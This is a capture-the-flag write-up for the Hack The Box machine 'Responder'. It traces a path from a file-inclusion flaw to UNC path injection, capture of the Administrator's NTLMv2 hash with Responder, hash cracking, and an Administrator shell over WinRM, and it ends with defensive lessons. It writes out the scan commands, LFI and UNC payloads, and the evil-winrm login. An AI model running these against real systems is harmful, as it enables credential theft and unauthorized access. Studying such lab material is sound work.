
Responder

- Platform: Hack The Box
- Difficulty: Easy
- Operating System: Windows

Objective

Identify and exploit vulnerabilities in the target web application to obtain unauthorized access to the Windows system.

---

Attack Path

Service Enumeration -> HTTP Service -> Language Parameter -> LFI and RFI -> UNC Path Injection -> Responder -> Administrator Hash Grab and Crack -> WinRM

---

Methodology

1. Initial Enumeration
2. Service Enumeration
3. Initial Access
4. Lessons Learned
5. Final Thoughts

---

1. Initial Enumeration

Port Enumeration

sudo nmap --top-ports 1000 $target -v

	80/tcp   open  http
	5985/tcp open  wsman

---

2. Service Enumeration

Port Scan

sudo nmap -sV -p 80,5985  $target -v

	80/tcp Apache httpd 2.4.52
	5985/tcp Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)


---


HTTP

firefox $target:80 &

- Domain
- LFI
- RFI
- UNC Path Injection

When attempting to access the http service, it returns that firefox was unable to connect to 'unika.htb server'. This issue was caused by name resolution, so I added an entry for 'unika.htb' to '/etc/hosts'.
After refreshing the page, the website presents information about 'Unika', a company that offers various web development services.
I explored the website looking for potentially useful information, such as employee names or other exposed data. I also inspected the page source code, but did not find any obvious attack vectors apart from the language selection functionality.
The page allows the user to switch language between French, German and English. When changing the language, the URL contains the following parameter:

	http://unika.htb/index.php?page=french.html

The 'page' parameter suggested a potential Local File Inclusion (LFI) or Remote File Inclusion (RFI) vulnerabilities.

LFI

To test for LFI, I tried to access 'page=/', the response contained the following warning: 'Permission denied in C:\xampp\htdocs\index.php'.
This confirmed that the application was processing the supplied value through a file inclusion mechanism.

Since that target was a Windows machine, I attempted to access common flag locations such as '../../users/administrator/desktop/flag.txt' and also 'root.txt'.
These attempts returned 'No such file or directory'.
I also attempted to access the Windows SAM database to identify local users, but the request returned 'Permission denied'.

RFI

Based on the 'page' parameter and the behavior observed during the LFI tests, I initially investigated whether the application was also vulnerable to Remote File Inclusion.
I first started a simple HTTP server on my machine and attempted to make the target retrieve a remote file 'http://unika.htb/index.php?page=http://<my-ip>/a'.
The application returned the following warning:

	  **Warning**: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0

This indicated that PHP's 'allow_url_include' configuration was preventing the application from including files trough the 'http://' wrapper.
I then tried removing the 'http:' portion 'http://unika.htb/index.php?page=//<my-ip>/a'.
This produced a different behavior. The response took several seconds to return and the error changed to 'No such file or directory'. However, my HTTP server did not receive any request.

At this point, I initially considered that I might have found a way to bypass the 'http:' wrapper restriction and continued investigating remote file access. During the exploitation process, I discovered that this behavior was actually related to Windows Universal Naming Convention (UNC) paths, rather than a traditional RFI vulnerability.

The '//<my-ip/a' syntax could be interpreted by the Windows environment as a remote network path. This allowed the target to be inducted into attempting to access a resource hosted on my machine.
To verify this behavior and determine whether the target would authenticate when accessing the remote resource, I started Responder.

RESPONDER

sudo responder -I tun0

I then supplied the remote path trough the vulnerable 'page' parameter 'http://unika.htb/index.php?page=//tun0-IP/a'.

The target attempted to access the remote source and authenticated against my listener. Responder successfully captured the Administrator's NTLMv2 challenge-response, which I subsequently cracked with Hashcat.
This clarified that the relevant technique was UNC Path Injection, rather than a traditional RFI vulnerability.

WSMAN

At this point, I had a valid Administrator credentials and the port 5985 open. 
Since TCP/5985 is commonly associated with Windows Remote Management (WinRM), I attempted to authenticate using Evil-WinRM:

evil-winrm -i $target -u Administrator -p '<password>'

The authentication was successful, providing an interactive shell on the target as Administrator.

---

3. Initial Access

After obtaining the shell, I explored the filesystem and found the user mike.
The room's flag was located at 'C:\Users\mike\Desktop\flag.txt'.

As an additional verification of the original web vulnerability (LFI), I also attempted to retrieve the same file trough the vulnerable 'page' parameter 'page=../../users/mike/desktop/flag.txt'. The application successfully returned the contents of the flag, confirming that the discovered LFI could be used to access local files on the Windows host.

---

4. Lessons Learned

- Always inspect URL parameters that control file paths for potential LFI vulnerabilities.
- When testing file inclusions on Windows targets, consider Windows-specific path formats such as UNC paths.
- Disabling the 'http://' wrapper does not necessarily prevent other mechanisms from causing the server to access remote resources. 
- Applications should not allow user-controlled input to be passed directly to file inclusion functions.
- NTLM authentication can expose password hashes when a Windows system is tricked into authenticating to an attacker-controlled service.
- Network services such as WinRM should be properly secured and should not be exposed unnecessarily.
- Strong passwords are important because captured NTLMv2 challenge-response hashes may be vulnerable to offline password cracking.

---

5.  Final Thoughts

Responder was a challenging machine because the initial LFI vulnerability did not immediately provide useful file access. The key was understanding how the vulnerability behaved on a Windows server and recognizing that the '//' syntax could be used to trigger a connection to a remote resource. 
By combining the LFI with a UNC path injection, it was possible to force the target to authenticate against Responder and capture the Administrator's NTLMv2 hash. After cracking the hash, the recovered credentials provided direct access to WinRM, resulting in full administrative access to the machine.
The machine demonstrates how a seemingly limited file inclusion vulnerability can become significantly more impactful when combined with Windows-specific behavior and insecure authentication mechanisms. 